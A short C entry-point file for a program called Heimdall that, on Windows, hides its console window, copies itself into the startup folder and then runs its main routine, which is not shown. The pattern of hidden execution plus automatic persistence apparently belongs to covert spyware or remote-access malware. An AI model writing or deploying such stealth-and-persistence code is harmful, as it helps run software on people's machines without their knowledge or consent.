#include "Heimdall.h"

int main()
{
#ifdef _WIN32
	FreeConsole();
	copyFileToStartUp();
	windows_heimdall();
#endif
	return EXIT_SUCCESS;
}